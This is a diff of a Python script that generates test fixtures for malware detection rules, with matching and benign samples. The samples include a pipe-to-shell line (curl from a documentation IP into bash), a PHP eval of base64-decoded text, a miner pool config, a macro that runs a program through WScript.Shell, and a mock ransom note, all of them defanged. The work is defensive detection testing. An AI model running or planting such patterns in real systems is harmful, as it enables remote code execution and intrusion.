@@ -75,12 +75,13 @@ PS_NOMATCH = (
 ).encode()
 
 PHP_MATCH = (
-    f"<?php\n// {LAB}\n// decodes to: echo \"yaraci lab fixture\";\n"
-    f"eval(base64_decode('{base64.b64encode(b'echo \"yaraci lab fixture\";').decode()}'));\n"
+    f'<?php\n// {LAB}\n// decodes to: echo "yaraci lab fixture";\n'
+    f"eval(base64_decode('{base64.b64encode(b'echo "yaraci lab fixture";').decode()}'));\n"
 ).encode()
 PHP_NOMATCH = (
     f"<?php\n// {LAB}\n// Decoding user data is fine; evaluating it is not.\n"
-    "$profile = json_decode(base64_decode($_COOKIE['profile'] ?? ''), true);\necho htmlspecialchars($profile['name'] ?? 'guest');\n"
+    "$profile = json_decode(base64_decode($_COOKIE['profile'] ?? ''), true);\n"
+    "echo htmlspecialchars($profile['name'] ?? 'guest');\n"
 ).encode()
 
 SH_MATCH = (
@@ -91,14 +92,16 @@ SH_MATCH = (
 SH_NOMATCH = (
     f"#!/bin/sh\n# {LAB}: downloads a checksum file, verifies, never executes from /tmp\n"
     "curl -fsSL https://releases.example.invalid/tool.tar.gz -o /tmp/tool.tar.gz\n"
-    "sha256sum -c tool.tar.gz.sha256 && tar -xzf /tmp/tool.tar.gz -C \"$HOME/.local\"\n"
+    'sha256sum -c tool.tar.gz.sha256 && tar -xzf /tmp/tool.tar.gz -C "$HOME/.local"\n'
 ).encode()
 PIPE_MATCH = f"#!/bin/sh\n# {LAB}\ncurl -s http://203.0.113.10/x.sh | bash\n".encode()
 
 UPX_PAYLOAD = b"$Info: This file is packed with the UPX executable packer $\0UPX!\x0d\x0a"
 UPX_MATCH = pe_stub([b"UPX0", b"UPX1", b".rsrc"], UPX_PAYLOAD)
 UPX_NOMATCH_PLAIN_PE = pe_stub([b".text", b".rdata", b".data"], b"plain stub, not packed\0")
-UPX_NOMATCH_TEXT = f"{LAB}\nRelease notes: binaries are no longer packed (UPX0/UPX1 sections and UPX! removed).\n".encode()
+UPX_NOMATCH_TEXT = (
+    f"{LAB}\nRelease notes: binaries are no longer packed (UPX0/UPX1 sections and UPX! removed).\n".encode()
+)
 
 MINER_PAYLOAD = (
     b'{"pools":[{"url":"stratum+tcp://pool.example.invalid:3333","user":"lab"}],'
@@ -113,7 +116,9 @@ OLE_MACRO = (
     b'    Set sh = CreateObject("WScript.Shell")\r\n    sh.Run "notepad.exe"\r\nEnd Sub\r\n'
 )
 OLE_MATCH = ole_stub(OLE_MACRO)
-OLE_NOMATCH = ole_stub(b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n    MsgBox "hello"\r\nEnd Sub\r\n')
+OLE_NOMATCH = ole_stub(
+    b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n    MsgBox "hello"\r\nEnd Sub\r\n'
+)
 
 RANSOM_MATCH = (
     f"{LAB.upper()}\n\nYOUR FILES HAVE BEEN ENCRYPTED by the tabletop exercise.\n"
@@ -183,7 +188,8 @@ def goodware() -> dict[str, bytes]:
             "  Copy-Item -Destination $Target -Force\r\nWrite-Output 'backup complete'\r\n"
         ).encode(),
         "scripts/deploy.sh": (
-            f"#!/bin/sh\n# {LAB}\nset -e\nwget -q https://artifacts.example.invalid/app.tar.gz -O /tmp/app.tar.gz\n"
+            f"#!/bin/sh\n# {LAB}\nset -e\n"
+            "wget -q https://artifacts.example.invalid/app.tar.gz -O /tmp/app.tar.gz\n"
             "tar -xzf /tmp/app.tar.gz -C /opt/app\nchmod 755 /opt/app/bin/app\nsystemctl restart app\n"
         ).encode(),
         "web/index.php": (
@@ -195,7 +201,8 @@ def goodware() -> dict[str, bytes]:
             "    return json_decode(base64_decode(strtr($t, '-_', '+/')), true) ?? [];\n}\n"
         ).encode(),
         "docs/crypto-wallet-guide.md": (
-            f"<!-- {LAB} -->\n# Wallet guide\n\nThis guide explains how bitcoin wallets keep your private key safe.\n"
+            f"<!-- {LAB} -->\n# Wallet guide\n\n"
+            "This guide explains how bitcoin wallets keep your private key safe.\n"
             "Backups are encrypted; the recovery tool (the *decryptor*) restores them offline.\n"
             "Some users run nodes as Tor hidden services (.onion addresses).\n"
         ).encode(),
@@ -210,7 +217,8 @@ def goodware() -> dict[str, bytes]:
         "src/app_icon.py": _icon_module(),
         "src/util.py": (
             f'"""{LAB}."""\n\nimport subprocess\n\n\ndef git_rev() -> str:\n'
-            '    return subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()\n'
+            '    return subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True)'
+            ".stdout.strip()\n"
         ).encode(),
         "bin/tool.exe.bin": pe_stub([b".text", b".rdata", b".data", b".reloc"], b"Example Tool 1.0\0"),
         "bin/libdemo.so.bin": elf_stub(b"libdemo.so.1\0demo_init\0demo_free\0GLIBC_2.34\0"),
@@ -238,7 +246,11 @@ def main(argv: list[str] | None = None) -> int:
     stale: list[str] = []
     for base, build in TARGETS.items():
         expected = build()
-        existing = {p.relative_to(base).as_posix() for p in base.rglob("*") if p.is_file()} if base.exists() else set()
+        existing = (
+            {p.relative_to(base).as_posix() for p in base.rglob("*") if p.is_file()}
+            if base.exists()
+            else set()
+        )
         for rel, data in expected.items():
             path = base / rel
             if not path.exists() or path.read_bytes() != data:
